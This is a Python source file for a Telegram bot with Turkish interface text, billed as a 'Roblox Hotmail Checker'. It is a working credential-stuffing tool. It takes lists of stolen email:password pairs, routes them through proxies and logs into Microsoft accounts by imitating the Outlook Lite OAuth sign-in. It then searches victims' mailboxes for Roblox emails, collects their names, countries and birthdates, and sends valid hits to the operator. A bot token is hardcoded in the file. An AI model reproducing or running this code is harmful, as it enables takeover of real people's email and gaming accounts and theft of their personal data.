import os
import sys
import time
import requests
import uuid
import json
import re
import threading
import telebot
from telebot import types
from queue import Queue, Empty
from datetime import datetime


# ─────────────────────────────────────────────
#  KONFİGÜRASYON
# ─────────────────────────────────────────────
BOT_TOKEN = "8879666700:AAGfBfwt7SnvFPusfW82cnBaKu2JwhZG68Y"
ADMIN_ID  = 7969180514

HITS_FILE   = "Roblox-Hits.txt"
CUSTOM_FILE = "Hotmail-Custom.txt"

MAX_RETRIES  = 5
THREAD_COUNT = 3

bot = telebot.TeleBot(BOT_TOKEN)


# ─────────────────────────────────────────────
#  GLOBAL STATE
# ─────────────────────────────────────────────
_lock = threading.Lock()
_stop_event = threading.Event()

_st_hits   = 0
_st_bad    = 0
_st_custom = 0
_st_retry  = 0
_st_total  = 0

_running = False
_proxy_list = []
_status_msg_id = None
_chat_id = None


# ─────────────────────────────────────────────
#  ROBLOX CORE
# ─────────────────────────────────────────────
def GIDD(username):
    url = "https://users.roblox.com/v1/usernames/users"
    payload = {"usernames": [username], "excludeBannedUsers": False}
    try:
        r = requests.post(url, json=payload, timeout=10)
        if r.status_code == 200 and r.json()["data"]:
            return r.json()["data"][0]["id"]
    except:
        pass
    return None


def CSRFFF():
    url = "https://catalog.roblox.com/v1/catalog/items/details"
    s = requests.Session()
    try:
        r = s.post(url, json={"items": []}, timeout=10)
        token = r.headers.get("x-csrf-token")
        return token, s
    except:
        return None, None


def GSNN(asset_ids):
    if not asset_ids:
        return []
    token, session = CSRFFF()
    if not token or not session:
        return []
    url = "https://catalog.roblox.com/v1/catalog/items/details"
    items = [{"itemType": "Asset", "id": int(aid)} for aid in asset_ids]
    headers = {"x-csrf-token": token}
    try:
        r = session.post(url, json={"items": items}, headers=headers, timeout=10)
        if r.status_code != 200:
            return []
        data = r.json().get("data", [])
        return [item.get("name", "Unknown Item") for item in data]
    except:
        return []


def ERUU(search_text):
    patterns = [
        r'account:\s*([a-zA-Z0-9_]+)',
        r'for\s+([a-zA-Z0-9_]+)\s+and\s+want',
        r'account:\s*([a-zA-Z0-9_]+)\.',
        r'for\s+([a-zA-Z0-9_]+)\.\s+If'
    ]
    for pattern in patterns:
        match = re.search(pattern, search_text, re.IGNORECASE)
        if match:
            return match.group(1)
    return None


def RLLL(username, proxies=None):
    result = {"username": username, "friends": 0, "banned": "No",
              "created": "Unknown", "profile": "", "wearing": []}
    user_id = GIDD(username)
    if not user_id:
        return None
    try:
        user_url = f"https://users.roblox.com/v1/users/{user_id}"
        user_res = requests.get(user_url, timeout=10, proxies=proxies)
        user_data = user_res.json()
        result["banned"] = "Yes" if user_data.get("isBanned", False) else "No"
        created_raw = user_data.get("created", "")
        result["created"] = created_raw.split("T")[0] if created_raw else "Unknown"

        friends_url = f"https://friends.roblox.com/v1/users/{user_id}/friends/count"
        friends_res = requests.get(friends_url, timeout=10, proxies=proxies)
        result["friends"] = friends_res.json().get("count", 0)

        result["profile"] = f"https://www.roblox.com/users/{user_id}/profile"

        wearing_url = f"https://avatar.roblox.com/v1/users/{user_id}/currently-wearing"
        wearing_res = requests.get(wearing_url, timeout=10, proxies=proxies)
        if wearing_res.status_code == 200:
            wearing_data = wearing_res.json()
            asset_ids = wearing_data.get("assetIds", [])
            result["wearing"] = GSNN(asset_ids)
    except:
        return None
    return result


def format_proxy(proxy):
    if not proxy:
        return None
    if '@' in proxy:
        userpass, ipport = proxy.split('@')
        user, passwd = userpass.split(':')
        ip, port = ipport.split(':')
        return {"http": f"http://{user}:{passwd}@{ip}:{port}",
                "https": f"http://{user}:{passwd}@{ip}:{port}"}
    else:
        ip, port = proxy.split(':')
        return {"http": f"http://{ip}:{port}",
                "https": f"http://{ip}:{port}"}


# ─────────────────────────────────────────────
#  CHECK COMBO
# ─────────────────────────────────────────────
def check_combo(email, password, proxies=None):
    session = requests.Session()
    if proxies:
        session.proxies = proxies

    try:
        user_agent = ("Mozilla/5.0 (Linux; Android 10; SM-G970F) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/120.0.0.0 Mobile Safari/537.36")

        url = (
            "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?"
            "client_info=1&haschrome=1&login_hint=" + str(email) +
            "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
            "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
        )
        headers = {
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "return-client-request-id": "false",
            "client-request-id": str(uuid.uuid4()),
            "x-ms-sso-ignore-sso": "1",
            "correlation-id": str(uuid.uuid4()),
            "x-client-ver": "1.1.0+9e54a0d1",
            "x-client-os": "28",
            "x-client-sku": "MSAL.xplat.android",
            "x-client-src-sku": "MSAL.xplat.android",
            "X-Requested-With": "com.microsoft.outlooklite",
            "Accept-Language": "en-US,en;q=0.9",
        }

        response = session.get(url, headers=headers, allow_redirects=True)
        response_text = response.text

        PPFT = ""
        urlPost = ""

        server_data_match = re.search(r'var ServerData = ({.*?});', response_text, re.DOTALL)
        if server_data_match:
            try:
                server_data = json.loads(server_data_match.group(1))
                sFTTag = server_data.get('sFTTag', '')
                if sFTTag:
                    ppft_match = re.search(r'value="([^"]+)"', sFTTag)
                    if ppft_match:
                        PPFT = ppft_match.group(1)
                urlPost = server_data.get('urlPost', '')
            except:
                pass

        if not PPFT:
            start_marker = 'name="PPFT" value="'
            start_index = response_text.find(start_marker)
            if start_index != -1:
                start_index += len(start_marker)
                end_index = response_text.find('"', start_index)
                PPFT = response_text[start_index:end_index] if end_index != -1 else ""

        if not urlPost:
            urlpost_match = re.search(r'"urlPost":"([^"]+)"', response_text)
            if urlpost_match:
                urlPost = urlpost_match.group(1)

        cookies_dict = session.cookies.get_dict()
        MSPRequ = cookies_dict.get('MSPRequ', '')
        uaid = cookies_dict.get('uaid', '')
        MSPOK = cookies_dict.get('MSPOK', '')
        OParams = cookies_dict.get('OParams', '')
        referer_url = response.url

        if not PPFT or not urlPost:
            return "BAD", None

        data_string = (
            f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition="
            f"&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy="
            f"&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={PPFT}&PPSX=Passport&NewUser=1"
            f"&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0"
            f"&isRecoveryAttemptPost=0&i19=3772"
        )
        LEN = len(data_string)

        headers_post = {
            "User-Agent": user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Host": "login.live.com",
            "Connection": "keep-alive",
            "Content-Length": str(LEN),
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "Origin": "https://login.live.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "com.microsoft.outlooklite",
            "Referer": referer_url,
            "Accept-Language": "en-US,en;q=0.9",
            "Cookie": f"MSPRequ={MSPRequ}; uaid={uaid}; MSPOK={MSPOK}; OParams={OParams}"
        }

        post_response = session.post(urlPost, data=data_string, headers=headers_post,
                                     allow_redirects=False)

        cookies_dict = session.cookies.get_dict()
        if "__Host-MSAAUTHP" not in cookies_dict:
            return "BAD", None

        auth_code = ""
        if post_response.status_code in [301, 302, 303, 307, 308]:
            redirect_url = post_response.headers.get('Location', '')
            if redirect_url and 'msauth://' in redirect_url and 'code=' in redirect_url:
                auth_code = redirect_url.split('code=')[1].split('&')[0]
        else:
            redirect_match = re.search(r'window\.location\s*=\s*["\']([^"\']+)["\']',
                                        post_response.text)
            if redirect_match:
                redirect_url = redirect_match.group(1)
                if 'msauth://' in redirect_url and 'code=' in redirect_url:
                    auth_code = redirect_url.split('code=')[1].split('&')[0]

        CID = cookies_dict.get('MSPCID', '')
        if CID:
            CID = CID.upper()

        access_token = ""
        if auth_code:
            data_token = {
                "client_info": "1",
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                "grant_type": "authorization_code",
                "code": auth_code,
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
            }
            token_response = requests.post(
                "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                data=data_token,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                timeout=30,
                proxies=proxies if proxies else None
            )
            if token_response.status_code == 200:
                access_token = token_response.json().get("access_token", "")

        Name = ""
        Country = ""
        Birthdate = "N/A"

        if not access_token or not CID:
            return "BAD", None

        search_url = "https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124"
        search_payload = {
            "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
            "Scenario": {"Name": "owa.react"},
            "TimeZone": "United Kingdom Standard Time",
            "TextDecorations": "Off",
            "EntityRequests": [{
                "EntityType": "Conversation",
                "ContentSources": ["Exchange"],
                "Filter": {"Or": [
                    {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                    {"Term": {"DistinguishedFolderName": "DeletedItems"}}
                ]},
                "From": 0,
                "Query": {"QueryString": "no-reply@roblox.com"},
                "Size": 25,
                "Sort": [
                    {"Field": "Score", "SortDirection": "Desc", "Count": 3},
                    {"Field": "Time", "SortDirection": "Desc"}
                ],
                "EnableTopResults": True,
                "TopResultsCount": 3
            }]
        }
        search_headers = {
            "User-Agent": "Outlook-Android/2.0",
            "Accept": "application/json",
            "Authorization": f"Bearer {access_token}",
            "X-AnchorMailbox": f"CID:{CID}",
            "Host": "substrate.office.com",
            "Content-Type": "application/json"
        }

        search_response = requests.post(search_url, json=search_payload, headers=search_headers,
                                         timeout=30, proxies=proxies if proxies else None)

        if search_response.status_code == 400:
            return "RETRY", None

        if search_response.status_code != 200:
            return "CUSTOM", f"{email}:{password} | Name = {Name} | Country = {Country} | Birthdate = {Birthdate}"

        search_text = search_response.text
        roblox_user = ERUU(search_text)

        profile_url = "https://substrate.office.com/profileb2/v2.0/me/V1Profile"
        profile_headers = {
            "User-Agent": "Outlook-Android/2.0",
            "Accept": "application/json",
            "Authorization": f"Bearer {access_token}",
            "X-AnchorMailbox": f"CID:{CID}",
            "Host": "substrate.office.com"
        }
        pRes = requests.get(profile_url, headers=profile_headers, timeout=30,
                             proxies=proxies if proxies else None)
        if pRes.status_code == 200:
            profile_data = pRes.json()
            if "accounts" in profile_data and len(profile_data["accounts"]) > 0:
                fa = profile_data["accounts"][0]
                Country = fa.get("location", "")
                BD = fa.get("birthDay", "")
                BM = fa.get("birthMonth", "")
                BY = fa.get("birthYear", "")
                if BD and BM and BY:
                    Birthdate = f"{BY}-{str(BM).zfill(2)}-{str(BD).zfill(2)}"
            if "names" in profile_data and len(profile_data["names"]) > 0:
                Name = profile_data["names"][0].get("displayName", "")

        total_start = search_text.find('"Total":')
        Total = "0"
        if total_start != -1:
            total_start += len('"Total":')
            total_end = search_text.find(',', total_start)
            if total_end == -1:
                total_end = search_text.find('}', total_start)
            Total = search_text[total_start:total_end] if total_end != -1 else "0"

        if Total != "0" and roblox_user:
            roblox_data = RLLL(roblox_user, proxies)
            if roblox_data:
                wearing_str = ", ".join(roblox_data["wearing"]) if roblox_data["wearing"] else ""
                hit_line = (f"{email}:{password} | Username = {roblox_data['username']} | "
                            f"Friends = {roblox_data['friends']} | Banned = {roblox_data['banned']} | "
                            f"Created = {roblox_data['created']} | Profile = {roblox_data['profile']} | "
                            f"Wearing = [{wearing_str}]")
                return "HIT", hit_line
            else:
                return "CUSTOM", f"{email}:{password} | Name = {Name} | Country = {Country} | Birthdate = {Birthdate}"
        else:
            return "CUSTOM", f"{email}:{password} | Name = {Name} | Country = {Country} | Birthdate = {Birthdate}"

    except (requests.exceptions.ProxyError,
            requests.exceptions.ConnectTimeout,
            requests.exceptions.ReadTimeout,
            requests.exceptions.ConnectionError,
            requests.exceptions.SSLError,
            requests.exceptions.ChunkedEncodingError):
        return "RETRY", None
    except Exception:
        return "BAD", None


# ─────────────────────────────────────────────
#  DOSYA İŞLEMLERİ
# ─────────────────────────────────────────────
def load_lines(path):
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return [l.strip() for l in f if l.strip()]
    except:
        try:
            with open(path, "r", encoding="latin-1", errors="ignore") as f:
                return [l.strip() for l in f if l.strip()]
        except:
            return []


def append_file(path, line):
    with _lock:
        try:
            with open(path, "a", encoding="utf-8") as f:
                f.write(line + "\n")
        except:
            with open(path, "a", encoding="latin-1", errors="ignore") as f:
                f.write(line + "\n")


# ─────────────────────────────────────────────
#  İSTATİSTİK / KLAVYE
# ─────────────────────────────────────────────
def stats_text():
    remaining = _st_total - (_st_hits + _st_bad + _st_custom)
    return (
        f"📊 <b>İSTATİSTİKLER</b>\n\n"
        f"✅ Hit: <b>{_st_hits}</b>\n"
        f"❌ Bad: <b>{_st_bad}</b>\n"
        f"📧 Custom: <b>{_st_custom}</b>\n"
        f"🔄 Retry: <b>{_st_retry}</b>\n"
        f"📦 Kalan: <b>{max(remaining, 0)}</b>\n"
        f"📁 Toplam: <b>{_st_total}</b>"
    )


def stop_keyboard():
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("⏹ Durdur", callback_data="stop_scan"))
    return kb


def update_status():
    global _status_msg_id
    if not _chat_id or not _status_msg_id:
        return
    try:
        bot.edit_message_text(
            stats_text(), _chat_id, _status_msg_id,
            parse_mode='HTML',
            reply_markup=stop_keyboard()
        )
    except:
        pass


# ─────────────────────────────────────────────
#  WORKER
# ─────────────────────────────────────────────
def worker(combo_queue, proxies_list):
    global _st_hits, _st_bad, _st_custom, _st_retry

    while not _stop_event.is_set():
        try:
            combo = combo_queue.get(timeout=1)
        except Empty:
            break

        if '@' not in combo or ':' not in combo:
            combo_queue.task_done()
            continue

        email, password = combo.split(':', 1)
        email, password = email.strip(), password.strip()

        proxies = None
        if proxies_list:
            raw = proxies_list[hash(combo) % len(proxies_list)]
            try:
                proxies = format_proxy(raw)
            except:
                proxies = None

        retries = 0
        done = False
        while retries < MAX_RETRIES and not done and not _stop_event.is_set():
            status, line = check_combo(email, password, proxies)

            if status == "RETRY":
                with _lock:
                    _st_retry += 1
                retries += 1
                time.sleep(0.2)
                continue

            if status == "HIT":
                with _lock:
                    _st_hits += 1
                append_file(HITS_FILE, line)

            elif status == "CUSTOM":
                with _lock:
                    _st_custom += 1
                append_file(CUSTOM_FILE, line)

            else:
                with _lock:
                    _st_bad += 1

            done = True

        combo_queue.task_done()
        update_status()


# ─────────────────────────────────────────────
#  ANA TARAMA
# ─────────────────────────────────────────────
def run_scan(combos, proxies_list, chat_id):
    global _st_hits, _st_bad, _st_custom, _st_retry, _st_total
    global _status_msg_id, _chat_id, _running

    _st_hits = _st_bad = _st_custom = _st_retry = 0
    _st_total = len(combos)
    _chat_id = chat_id
    _stop_event.clear()
    _running = True

    for f in (HITS_FILE, CUSTOM_FILE):
        if os.path.exists(f):
            try:
                os.remove(f)
            except:
                pass

    msg = bot.send_message(chat_id, stats_text(), parse_mode='HTML',
                            reply_markup=stop_keyboard())
    _status_msg_id = msg.message_id

    q = Queue()
    for c in combos:
        q.put(c)

    threads = []
    for _ in range(min(THREAD_COUNT, len(combos))):
        t = threading.Thread(target=worker, args=(q, proxies_list), daemon=True)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    _running = False

    try:
        bot.edit_message_text(
            f"✅ <b>TARAMA BİTTİ</b>\n\n{stats_text()}",
            chat_id, _status_msg_id, parse_mode='HTML')
    except:
        pass

    if os.path.exists(HITS_FILE) and os.path.getsize(HITS_FILE) > 0:
        try:
            with open(HITS_FILE, 'rb') as f:
                bot.send_document(chat_id, f, caption=f"📁 Roblox Hits — {_st_hits} adet")
        except:
            pass

    if os.path.exists(CUSTOM_FILE) and os.path.getsize(CUSTOM_FILE) > 0:
        try:
            with open(CUSTOM_FILE, 'rb') as f:
                bot.send_document(chat_id, f, caption=f"📁 Custom — {_st_custom} adet")
        except:
            pass


# ─────────────────────────────────────────────
#  TELEGRAM KOMUTLARI
# ─────────────────────────────────────────────
@bot.message_handler(commands=['start'])
def cmd_start(message):
    if message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "❌ Yetkisiz.")
        return

    text = (
        "🤖 <b>Roblox Hotmail Checker Bot</b>\n\n"
        "📋 <b>Komutlar:</b>\n"
        "/check — Combo dosyası yükle ve tara\n"
        "/proxy — Proxy dosyası yükle (opsiyonel)\n"
        "/stop — Taramayı durdur\n"
        "/stats — Anlık istatistik\n"
        "/hits — Hit dosyasını indir\n\n"
        "⚙️ <b>Akış:</b>\n"
        "1. /proxy ile proxy yükle (opsiyonel)\n"
        "2. /check ile combo dosyası yükle\n"
        "3. Bot otomatik başlar\n\n"
        "📢 Hit'ler tarama bitince dosya olarak gönderilir."
    )
    bot.send_message(message.chat.id, text, parse_mode='HTML')


@bot.message_handler(commands=['check'])
def cmd_check(message):
    if message.from_user.id != ADMIN_ID:
        return
    msg = bot.send_message(message.chat.id, "📁 Combo dosyasını gönder (.txt)")
    bot.register_next_step_handler(msg, handle_combo_file)


@bot.message_handler(commands=['proxy'])
def cmd_proxy(message):
    if message.from_user.id != ADMIN_ID:
        return
    msg = bot.send_message(message.chat.id, "📁 Proxy dosyasını gönder (.txt)")
    bot.register_next_step_handler(msg, handle_proxy_file)


@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    if message.from_user.id != ADMIN_ID:
        return
    _stop_event.set()
    bot.send_message(message.chat.id, "⏹ Durdurma sinyali gönderildi.")


@bot.message_handler(commands=['stats'])
def cmd_stats(message):
    if message.from_user.id != ADMIN_ID:
        return
    bot.send_message(message.chat.id, stats_text(), parse_mode='HTML')


@bot.message_handler(commands=['hits'])
def cmd_hits(message):
    if message.from_user.id != ADMIN_ID:
        return
    if not os.path.exists(HITS_FILE):
        bot.send_message(message.chat.id, "❌ Hit dosyası yok.")
        return
    with open(HITS_FILE, 'rb') as f:
        bot.send_document(message.chat.id, f)


def handle_combo_file(message):
    global _proxy_list

    if message.from_user.id != ADMIN_ID:
        return

    if not message.document:
        bot.send_message(message.chat.id, "❌ Dosya göndermedin.")
        return

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        path = f"combo_{message.from_user.id}.txt"
        with open(path, 'wb') as f:
            f.write(downloaded)

        combos = [l for l in load_lines(path) if '@' in l and ':' in l]
        if not combos:
            bot.send_message(message.chat.id, "❌ Geçerli combo yok.")
            return

        bot.send_message(message.chat.id, f"✅ {len(combos)} combo yüklendi. Başlıyor...")
        threading.Thread(
            target=run_scan,
            args=(combos, _proxy_list, message.chat.id),
            daemon=True
        ).start()

    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Hata: {e}")


def handle_proxy_file(message):
    global _proxy_list

    if message.from_user.id != ADMIN_ID:
        return

    if not message.document:
        bot.send_message(message.chat.id, "❌ Dosya göndermedin.")
        return

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        path = f"proxy_{message.from_user.id}.txt"
        with open(path, 'wb') as f:
            f.write(downloaded)

        _proxy_list = load_lines(path)
        bot.send_message(message.chat.id, f"✅ {len(_proxy_list)} proxy yüklendi.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Hata: {e}")


@bot.callback_query_handler(func=lambda call: call.data == "stop_scan")
def cb_stop(call):
    if call.from_user.id != ADMIN_ID:
        return
    _stop_event.set()
    bot.answer_callback_query(call.id, "Durduruluyor...")


# ─────────────────────────────────────────────
#  START
# ─────────────────────────────────────────────
if __name__ == "__main__":
    print("Bot çalışıyor...")
    bot.infinity_polling(timeout=60, long_polling_timeout=60)
